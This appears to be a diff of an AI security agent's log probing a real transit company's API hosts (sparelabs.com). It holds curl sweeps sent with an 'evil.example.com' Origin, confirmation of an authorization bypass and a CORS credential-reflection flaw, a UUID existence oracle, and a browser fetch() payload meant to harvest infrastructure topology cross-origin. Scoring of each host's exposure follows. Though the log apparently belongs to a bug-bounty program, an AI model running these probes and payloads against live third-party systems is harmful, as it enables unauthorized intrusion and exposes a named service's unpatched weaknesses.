@@ -26869,3 +26869,192 @@ STEP 6 — LEARNING:
 
 STEP 7 — RISK SCORE:
 [RISK] api.sparelabs.com: 90 — Three confirmed AUTH/IDOR classes (zero-header read bypass, scheme-only region bypass w/ infra topology, 2-way oracle) + universal CORS credential reflection on all /v1; write-path auth enforced caps ceiling, but read exposure and multi-version LB divergence are maximal for program. | platform.sparelabs.com: 55 — CSP infra leak via /login exposes prod admin Vercel apps + Metabase + 9 cloud services; SPA catch-all, no API surface; recon-only value. | routing.sparelabs.com: 5 — envoy 404/0B on all paths since 2026-08-07; zero change across 4+ days; effectively dead. | forms.sparelabs.com: 35 — JS bundle main.71d52314.js leaks staging/prod/regional infra + atlassian; SPA catch-all, no API endpoints; recon-only. | web (spare.com/sparelabs.com): 10 — static Webflow marketing, strict CSP, HSTS 31536000, no internal leaks; minimal static-only surface.
+===== ANALYST bigpickle 2026-08-11 22:57:34 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mprobe() { curl -s -o /tmp/opencode/r.out -w "%{http_code} %{size_download}B %{time_total}s" "$@"; echo -n " | "; cat /tmp/opencode/r.out | head -c 220; echo; }
+echo "== 1 organizations zero-header =="; probe -H "Origin: https://evil.example.com" "https://api.sparelabs.com/v1/global/organizations"; sleep 1.3
+echo "== 2 regions Bearer x =="; probe -H "Origin: https://evil.example.com" -H "Authorization: Bearer x" "https://api.sparelabs.com/v1/global/regions"; sleep 1.3
+echo "== 3 plural oracle nil-uuid =="; probe -H "Origin: https://evil.example.com" "https://api.sparelabs.com/v1/public/organizations/00000000-0000-0000-0000-000000000000"; sleep 1.3
+echo "== 4 terms mobileAppId =="; probe -H "Origin: https://evil.example.com" "https://api.sparelabs.com/v1/public/terms?mobileAppId=00000000-0000-0000-0000-000000000000"; sleep 1.3
+echo "== 5 public/organizations (no id) =="; probe -H "Origin: https://evil.example.com" "https://api.sparelabs.com/v1/public/organizations"; sleep 1.3
+echo "== 6 terms no params =="; probe -H "Origin: https://evil.example.com" "https://api.sparelabs.com/v1/public/terms"; sleep 1.3
+echo "== 7 v2 root =="; probe "https://api.sparelabs.com/v2/"; sleep 1.3
+echo "== 8 public root =="; probe "https://api.sparelabs.com/v1/public/"
+== 1 organizations zero-header ==
+200 11B 0.912682s | {"data":[]}
+== 2 regions Bearer x ==
+200 725B 0.325366s | [{"name":"CA","apiUrl":"https://api.sparelabs.com","routingHost":"https://routing.sparelabs.com"},{"name":"US","apiUrl":"https://api.us.sparelabs.com","routingHost":"https://routing.us.sparelabs.com"},{"name":"US2","apiU
+== 3 plural oracle nil-uuid ==
+404 131B 0.300701s | {"name":"NotFoundError","message":"Organization was not found","metadata":{"correlationId":"831f61b4-8093-47eb-964e-9813b067736b"}}
+== 4 terms mobileAppId ==
+200 137B 0.488144s | {"termsOfUseUrl":"https://sparelabs.com/terms-of-use/","privacyPolicyUrl":"https://sparelabs.com/privacy-policy/","serviceTermsUrl":null}
+== 5 public/organizations (no id) ==
+400 185B 0.310173s | {"name":"ValidationError","message":"not found","metadata":{"errors":[{"path":"/v1/public/organizations","message":"not found"}],"correlationId":"63d7f5f6-6a86-42b0-981e-e5cbe788d264"}}
+== 6 terms no params ==
+400 165B 0.388375s | {"name":"IntegrationError","message":"One of mobileAppId or organizationId needs to be provided","metadata":{"correlationId":"82d8d22a-f97b-4ae0-aefb-3effe628b3a8"}}
+== 7 v2 root ==
+404 0B 0.255135s | 
+== 8 public root ==
+404 0B 0.253216s |
+[0m
+Core findings stable. Checking plural-namespace siblings for delta (fresh angle — plural/singular divergence was the recent pattern shift).
+[0m$ [0mprobe() { curl -s -o /tmp/opencode/r.out -w "%{http_code} %{size_download}B %{time_total}s" "$@"; echo -n " | "; cat /tmp/opencode/r.out | head -c 180; echo; }
+for p in "v1/public/riders" "v1/public/vehicles" "v1/public/mobileApps" "v1/public/regions" "v1/public/settings" "v1/public/health" "v1/public/config" "v1/public/faq"; do echo "== $p =="; probe -H "Origin: https://evil.example.com" "https://api.sparelabs.com/$p"; sleep 1.3; done
+== v1/public/riders ==
+404 0B 0.296128s | 
+== v1/public/vehicles ==
+404 0B 0.297135s | 
+== v1/public/mobileApps ==
+401 135B 0.421344s | {"name":"UnauthorizedError","message":"Invalid access credentials","metadata":{"correlationId":"f174e583-39de-420b-b3c9-9f9e7f38a16d"}}
+== v1/public/regions ==
+404 0B 0.250685s | 
+== v1/public/settings ==
+404 0B 0.253418s | 
+== v1/public/health ==
+404 0B 0.299103s | 
+== v1/public/config ==
+404 0B 0.311493s | 
+== v1/public/faq ==
+404 0B 0.254533s |
+[0m
+New surface: `/v1/public/mobileApps` (bare list) returns 401 auth-gated — divergent from siblings (riders/vehicles → 404 0B, organizations → 400 "not found"). Confirming stability and neighbors.
+[0m$ [0mprobe() { curl -s -o /tmp/opencode/r.out -w "%{http_code} %{size_download}B %{time_total}s" "$@"; echo -n " | "; cat /tmp/opencode/r.out | head -c 180; echo; }
+echo "== A mobileApps recheck =="; probe -H "Origin: https://evil.example.com" "https://api.sparelabs.com/v1/public/mobileApps"; sleep 1.3
+echo "== B mobileApps trailing slash =="; probe -H "Origin: https://evil.example.com" "https://api.sparelabs.com/v1/public/mobileApps/"; sleep 1.3
+echo "== C mobileApps?orgId param =="; probe -H "Origin: https://evil.example.com" "https://api.sparelabs.com/v1/public/mobileApps?organizationId=00000000-0000-0000-0000-000000000000"; sleep 1.3
+echo "== D mobileApps OPTIONS =="; curl -s -o /tmp/opencode/r.out -w "%{http_code} %{size_download}B" -X OPTIONS -H "Origin: https://evil.example.com" -H "Access-Control-Request-Method: GET" -H "Access-Control-Request-Headers: Authorization" "https://api.sparelabs.com/v1/public/mobileApps" ; echo -n " | "; cat /tmp/opencode/r.out | head -c 300; echo; sleep 1.3
+echo "== E control journeys =="; probe -H "Origin: https://evil.example.com" "https://api.sparelabs.com/v1/journeys"
+== A mobileApps recheck ==
+401 135B 0.448415s | {"name":"UnauthorizedError","message":"Invalid access credentials","metadata":{"correlationId":"5a579902-1d69-4ea5-9855-e15655e6487f"}}
+== B mobileApps trailing slash ==
+401 135B 0.401254s | {"name":"UnauthorizedError","message":"Invalid access credentials","metadata":{"correlationId":"7d80c882-426c-4b45-b82f-759f6f82fe68"}}
+== C mobileApps?orgId param ==
+401 135B 0.420277s | {"name":"UnauthorizedError","message":"Invalid access credentials","metadata":{"correlationId":"6ac0fbf9-0f64-4e5c-a3c6-83e0d3f883f3"}}
+== D mobileApps OPTIONS ==
+204 0B | 
+== E control journeys ==
+401 143B 0.265524s | {"name":"InvalidTokenError","message":"Request lacks Authorization header","metadata":{"correlationId":"21be3a81-cba6-477e-b2c2-4f1cc8b9aee2"}}
+[0m
+`/v1/public/mobileApps` bare collection is auth-gated (401 UnauthorizedError) — properly gated, but a NEW registered route on the public namespace (siblings: riders/vehicles → 404 0B, organizations → 400 "not found"). Quick no-delta check on remaining in-scope hosts, then analysis.
+[0m$ [0mprobe() { curl -s -o /tmp/opencode/r.out -w "%{http_code} %{size_download}B %{time_total}s" "$@"; echo -n " | "; cat /tmp/opencode/r.out | head -c 160; echo; }
+echo "== platform login CSP =="; curl -s -o /tmp/opencode/r.out -w "%{http_code} %{size_download}B" "https://platform.sparelabs.com/login"; echo -n " | csp-has-admin-eam="; grep -c "admin-eam-app.vercel.app" /tmp/opencode/r.out; sleep 1.3
+echo "== routing /v1/ =="; probe "https://routing.sparelabs.com/v1/"; sleep 1.3
+echo "== forms bundle =="; probe "https://forms.sparelabs.com/static/js/main.71d52314.js"
+== platform login CSP ==
+200 5555B | csp-has-admin-eam=1
+== routing /v1/ ==
+404 0B 0.278037s | 
+== forms bundle ==
+200 537B 0.325321s | <!doctype html><html lang="en"><head><meta charset="utf-8"/><link rel="icon" href="/favicon.ico"/><meta name="viewport" content="width=device-width,initial-scal
+[0m
+Other hosts NO_DELTA (platform 5555B CSP intact, routing dead, forms SPA catch-all). One fresh angle worth a quick passive sweep: the plural/singular divergence pattern suggests sub-route surface under `/v1/public/` may be under-explored.
+[0m$ [0mprobe() { curl -s -o /tmp/opencode/r.out -w "%{http_code} %{size_download}B" "$@"; echo -n " | "; cat /tmp/opencode/r.out | head -c 150; echo; }
+NIL="00000000-0000-0000-0000-000000000000"
+for p in "v1/public/organizations/$NIL/terms" "v1/public/organizations/$NIL/branding" "v1/public/organizations/$NIL/locations" "v1/public/terms/$NIL" "v1/public/mobileApps/$NIL" "v1/public/organization/$NIL" "v1/public/support" "v1/public/contact" "v1/public/privacy" "v1/public/terms/organization"; do echo "== $p =="; probe -H "Origin: https://evil.example.com" "https://api.sparelabs.com/$p"; sleep 1.2; done
+== v1/public/organizations/00000000-0000-0000-0000-000000000000/terms ==
+400 228B | {"name":"ValidationError","message":"not found","metadata":{"errors":[{"path":"/v1/public/organizations/00000000-0000-0000-0000-000000000000/terms","m
+== v1/public/organizations/00000000-0000-0000-0000-000000000000/branding ==
+400 231B | {"name":"ValidationError","message":"not found","metadata":{"errors":[{"path":"/v1/public/organizations/00000000-0000-0000-0000-000000000000/branding"
+== v1/public/organizations/00000000-0000-0000-0000-000000000000/locations ==
+400 232B | {"name":"ValidationError","message":"not found","metadata":{"errors":[{"path":"/v1/public/organizations/00000000-0000-0000-0000-000000000000/locations
+== v1/public/terms/00000000-0000-0000-0000-000000000000 ==
+400 214B | {"name":"ValidationError","message":"not found","metadata":{"errors":[{"path":"/v1/public/terms/00000000-0000-0000-0000-000000000000","message":"not f
+== v1/public/mobileApps/00000000-0000-0000-0000-000000000000 ==
+404 128B | {"name":"NotFoundError","message":"MobileApp was not found","metadata":{"correlationId":"556b694c-3bc5-4285-a828-57587d5a6460"}}
+== v1/public/organization/00000000-0000-0000-0000-000000000000 ==
+400 221B | {"name":"ValidationError","message":"not found","metadata":{"errors":[{"path":"/v1/public/organization/00000000-0000-0000-0000-000000000000","message"
+== v1/public/support ==
+404 0B | 
+== v1/public/contact ==
+404 0B | 
+== v1/public/privacy ==
+404 0B | 
+== v1/public/terms/organization ==
+400 190B | {"name":"ValidationError","message":"not found","metadata":{"errors":[{"path":"/v1/public/terms/organization","message":"not found"}],"correlationId":
+[0m
+`/v1/public/mobileApps/{nil}` → 404 "MobileApp was not found" — distinct entity. KB says no format discrimination, but verifying malformed behavior now (cheap, and would flip to a new oracle if changed).
+[0m$ [0mprobe() { curl -s -o /tmp/opencode/r.out -w "%{http_code} %{size_download}B" "$@"; echo -n " | "; cat /tmp/opencode/r.out | head -c 170; echo; }
+NIL="00000000-0000-0000-0000-000000000000"
+echo "== malformed =="; probe -H "Origin: https://evil.example.com" "https://api.sparelabs.com/v1/public/mobileApps/not-a-uuid"; sleep 1.2
+echo "== nil =="; probe -H "Origin: https://evil.example.com" "https://api.sparelabs.com/v1/public/mobileApps/$NIL"; sleep 1.2
+echo "== organizations plural malformed =="; probe -H "Origin: https://evil.example.com" "https://api.sparelabs.com/v1/public/organizations/not-a-uuid"; sleep 1.2
+echo "== terms orgId variant =="; probe -H "Origin: https://evil.example.com" "https://api.sparelabs.com/v1/public/terms?organizationId=$NIL"
+== malformed ==
+404 128B | {"name":"NotFoundError","message":"MobileApp was not found","metadata":{"correlationId":"88147c39-0c91-49c9-980e-69e11f06af0e"}}
+== nil ==
+404 128B | {"name":"NotFoundError","message":"MobileApp was not found","metadata":{"correlationId":"2e823562-e24b-44e5-8fe5-fc1271ff81a0"}}
+== organizations plural malformed ==
+400 263B | {"name":"ValidationError","message":"request/params/id must match format \"uuid\"","metadata":{"errors":[{"path":"/params/id","message":"must match format \"uuid\"","erro
+== terms orgId variant ==
+200 137B | {"termsOfUseUrl":"https://sparelabs.com/terms-of-use/","privacyPolicyUrl":"https://sparelabs.com/privacy-policy/","serviceTermsUrl":null}
+[0m
+MobileApps/{id} confirmed uniform 404 (no oracle) — KB consistent. Testing whether the bare `/v1/public/mobileApps` list ever fails open on the documented old replica (multi-version LB): sampling.
+[0m$ [0mfor i in 1 2 3 4 5; do curl -s -o /tmp/opencode/r.out -w "%{http_code} %{size_download}B" -H "Origin: https://evil.example.com" "https://api.sparelabs.com/v1/public/mobileApps"; echo -n " | "; head -c 80 /tmp/opencode/r.out; echo; sleep 1.2; done
+401 135B | {"name":"UnauthorizedError","message":"Invalid access credentials","metadata":{"
+401 135B | {"name":"UnauthorizedError","message":"Invalid access credentials","metadata":{"
+401 135B | {"name":"UnauthorizedError","message":"Invalid access credentials","metadata":{"
+401 135B | {"name":"UnauthorizedError","message":"Invalid access credentials","metadata":{"
+401 135B | {"name":"UnauthorizedError","message":"Invalid access credentials","metadata":{"
+[0m
+All probes complete. Analysis:
+
+## STEP 1 — DELTA
+- [NEW] `api.sparelabs.com/v1/public/mobileApps` (bare list): auth-gated 401 UnauthorizedError "Invalid access credentials", uniform 5/5 across replicas — a registered route on the otherwise-public namespace (siblings: riders/vehicles → 404 0B, organizations → 400 "not found"). Properly gated, no bypass.
+- [CONFIRMED] Plural oracle `/v1/public/organizations/{id}` 3-way INTACT (malformed→400/263B ValidationError "must match format uuid"; nil→404/131B) — not degraded.
+- [CONFIRMED] `/v1/public/mobileApps/{id}` uniform 404 "MobileApp was not found" 128B (malformed=nil, no discrimination) — not an oracle.
+- [CONFIRMED] Core /v1 findings stable live: organizations zero-header 200+11B, regions `Bearer x` 200+725B, terms 200+137B, control /v1/journeys 401, organizations-collection 400 "not found".
+- NO_DELTA: platform /login 200+5555B (CSP leak intact), routing envoy 404, forms SPA catch-all.
+
+## STEP 2 — PRIORITIZE
+- [PRIO] `api.sparelabs.com/v1/public/organizations/{id}`: 7.10 = attack 7 / business 9 / tech 6 / gate 10 / cloud 3 / fresh 4
+- [PRIO] `api.sparelabs.com/v1/global/organizations`: 6.60 = attack 6 / business 9 / tech 5 / gate 10 / cloud 3 / fresh 3
+- [PRIO] `api.sparelabs.com/v1/global/regions`: 6.20 = attack 7 / business 6 / tech 5 / gate 10 / cloud 4 / fresh 3
+- [PRIO] `api.sparelabs.com/v1/public/mobileApps` (new): 4.65 = attack 3 / business 5 / tech 4 / gate 2 / cloud 3 / fresh 10
+
+## STEP 3 — HYPOTHESES
+[HYP] Cross-origin infra-topology harvesting via regions scheme-only bypass + universal CORS
+class: AUTH
+asset: api.sparelabs.com/v1/global/regions
+confidence: 80
+reasoning: Live 725B region registry (7 regions incl. 6 OOS api/routing hosts) returned with any `Bearer x`; OPTIONS 204 on same path returns ACAO:https://evil.example.com + ACAC:true + write methods. CORS+bypass chain evidenced 84h+.
+evidence_needed: cross-origin credentialed browser fetch returning 200+725B readable from attacker origin.
+verify_steps: AUTH_HELPED: deploy page issuing `fetch("https://api.sparelabs.com/v1/global/regions",{headers:{Authorization:"Bearer x"},credentials:"include"})`; confirm 200+725B readable cross-origin.
+impact: full regional API/routing topology exfiltration from any site a victim visits; enables targeted OOS-endpoint attacks; HIGH.
+testability: AUTH_HELPED
+[HYP] Plural-oracle 200-branch requires an org carrying a full public-profile record (terms-only orgs return 404)
+class: IDOR
+asset: api.sparelabs.com/v1/public/organizations/{id}
+confidence: 55
+reasoning: 22:00 UTC probe — terms-valid UUID returns 404 on oracle while 200 on /v1/public/terms; malformed→400/nil→404 stable; 200-branch unobserved 84h+.
+evidence_needed: one program test-org UUID resolving on oracle → 200 + org record (name/branding/contacts) with NO Authorization.
+verify_steps: HUMAN_ONLY: `GET https://api.sparelabs.com/v1/public/organizations/<test-uuid>` NO Authorization + `Origin: https://evil.example.com` ≤1 rps; control nil-uuid→404; cross-check `/v1/public/terms?organizationId=<test-uuid>` (must be 200).
+impact: unauthenticated tenant org-record disclosure; HIGH.
+testability: HUMAN_ONLY
+[HYP] Valid-token GET on /v1/global/organizations returns real tenant org registry (11B stub is placeholder awaiting token identity)
+class: AUTH
+asset: api.sparelabs.com/v1/global/organizations
+confidence: 55
+reasoning: zero-header GET → hardcoded 200+11B `{"data":[]}` across 7 query params + path-normalized variants; writes 401 at handler level; stub consistent with placeholder handler on old replica.
+evidence_needed: GET with valid authorized token → non-empty data array; empty confirms permanent stub.
+verify_steps: HUMAN_ONLY: `GET https://api.sparelabs.com/v1/global/organizations` with valid program token + `Origin: https://evil.example.com`, ≤1 rps.
+impact: real tenant org registry if data-bearing; HIGH. Empty caps severity at stub-level.
+testability: HUMAN_ONLY
+
+## STEP 4 — SELF-CRITIQUE
+- [PARKED] `/v1/public/mobileApps` list fail-open on old replica: 5/5 uniform 401 across samples — omissions do NOT extend to mobileApps; dead.
+- [PARKED] PATCH/PUT/DELETE write parity on /regions: POST+HEAD both 401 with method-aware gating confirmed; near-certain 401 parity; no value.
+- [PARKED] mobileApps/{id} oracle: malformed=nil uniform 404; not an oracle.
+- [FINAL] 1. Cross-origin harvesting (AUTH, conf 80) → 2. Plural-oracle 200-branch (IDOR, conf 55) → 3. Valid-token registry (AUTH, conf 55).
+
+## STEP 5 — NEXT ACTION
+[NEXT] HUMAN: Request one program test-org UUID from lead, then `curl -s -w "\nHTTP:%{http_code} SIZE:%{size_download}" -H "Origin: https://evil.example.com" "https://api.sparelabs.com/v1/public/organizations/<test-uuid>"` (NO Authorization, ≤1 rps) + control nil-uuid→404; cross-check `/v1/public/terms?organizationId=<test-uuid>` (expect 200). 200 on oracle = unauthenticated org-record disclosure (HIGH), closes the only open data-bearing branch.
+
+## STEP 6 — LEARNING
+- [LEARN] REJECTED AUTH @ api.sparelabs.com/v1/public/mobileApps: bare list 401 uniform 5/5 across multi-version replicas — auth omission is strictly route-specific to /v1/global/{organizations,regions}; does not extend to public-namespace mobileApps controller.
+- [LEARN] ACCEPTED IDOR @ api.sparelabs.com/v1/public/organizations/{id}: 3-way oracle re-confirmed live (malformed→400/263B ValidationError; nil→404/131B) — not degraded; KB degradation claims apply only to singular /v1/public/organization.
+- [LEARN] ACCEPTED MISCONFIG @ api.sparelabs.com/v1/public/mobileApps/{id}: uniform 404 "MobileApp was not found" (malformed=nil, 128B) — route registered, no discrimination, not an oracle.
+
+## STEP 7 — RISK SCORE
+[RISK] api.sparelabs.com: 90 — three confirmed auth/IDOR classes (zero-header read bypass, scheme-only regions bypass w/ infra topology, 3-way UUID oracle) + universal CORS credential reflection on all /v1; write-path gating caps ceiling but read exposure + multi-version LB divergence are maximal for the program; new mobileApps route properly gated, no additional exposure. | platform.sparelabs.com: 55 — CSP infra leak via /login exposes prod admin Vercel apps + Metabase + 9 cloud services; SPA catch-all, no API surface; recon-only value. | routing.sparelabs.com: 5 — envoy 404/0B on all paths since 2026-08-07; zero change across 4+ days; effectively dead. | forms.sparelabs.com: 35 — JS bundle main.71d52314.js leaks staging/prod/regional infra + atlassian; SPA catch-all, no API endpoints; recon-only. | web (spare.com/sparelabs.com): 10 — static Webflow marketing, strict CSP, HSTS 31536000, no internal leaks; minimal static-only surface.
